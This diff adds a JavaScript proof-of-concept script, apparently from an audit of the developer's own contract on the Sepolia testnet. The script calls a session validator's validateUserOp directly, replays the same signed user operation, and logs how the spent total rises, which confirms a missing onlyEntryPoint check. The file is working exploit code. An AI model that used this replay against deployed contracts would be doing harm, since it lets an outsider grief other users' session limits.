@@ -1,0 +1,31 @@
+import { ethers } from "ethers";
+import { Prover } from "./prover.js";
+import { readFileSync } from "fs";
+const RPC="https://ethereum-sepolia-rpc.publicnode.com";
+const VALIDATOR="0x5c2736F56506526e76E40D88981E4E41B0FA8807";
+const PK=readFileSync(".env","utf8").match(/^PRIVATE_KEY=(.+)$/m)[1].trim();
+const provider=new ethers.JsonRpcProvider(RPC);
+const master=new ethers.Wallet(PK,provider);
+const masterAddr=await master.getAddress();
+const chainId=(await provider.getNetwork()).chainId;
+const X="0x1111111111111111111111111111111111111111";
+const ABI=["function validateUserOp((address,uint256,bytes,bytes,bytes32,uint256,bytes32,bytes,bytes),bytes32,uint256) returns (uint256)","function getSession(address,address) view returns ((uint48,uint208,uint256,bytes32,uint256,bool,bool))"];
+const validator=new ethers.Contract(VALIDATOR,ABI,provider);
+function hUO(op){const pk=ethers.AbiCoder.defaultAbiCoder().encode(['address','uint256','bytes32','bytes32','bytes32','uint256','bytes32'],[op.sender,op.nonce,ethers.keccak256(op.initCode),ethers.keccak256(op.callData),op.accountGasLimits,op.preVerificationGas,op.gasFees]);return ethers.keccak256(ethers.AbiCoder.defaultAbiCoder().encode(['bytes32','address','uint256'],[ethers.keccak256(pk),VALIDATOR,chainId]));}
+const toArr=(o)=>[o.sender,o.nonce,o.initCode,o.callData,o.accountGasLimits,o.preVerificationGas,o.gasFees,o.paymasterAndData,o.signature];
+const prover=new Prover(RPC,VALIDATOR); await prover.init();
+const sess=JSON.parse(readFileSync("active_session.json","utf8"));
+const sk=new ethers.Wallet(sess.privateKey);
+const spent=async()=> (await validator.getSession(masterAddr,sk.address))[2];
+console.log("spentSoFar AWAL:", ethers.formatEther(await spent()),"ETH");
+const opX=await prover.signAction(masterAddr,X,"0x",ethers.parseEther("0.001"));
+const hX=hUO(opX);
+const vw=validator.connect(master); // sesiapa (bukan EntryPoint) boleh hantar
+console.log("[attacker] hantar validateUserOp TERUS (bukan EntryPoint)...");
+let t=await vw.validateUserOp(toArr(opX),hX,0); await t.wait();
+console.log("spentSoFar lepas 1x:", ethers.formatEther(await spent()),"ETH");
+console.log("[attacker] REPLAY userOp SAMA...");
+t=await vw.validateUserOp(toArr(opX),hX,0); await t.wait();
+console.log("spentSoFar lepas replay:", ethers.formatEther(await spent()),"ETH");
+console.log(">>> delta naik tanpa gamer act = C GRIEF confirmed (perlu onlyEntryPoint)");
+process.exit(0);
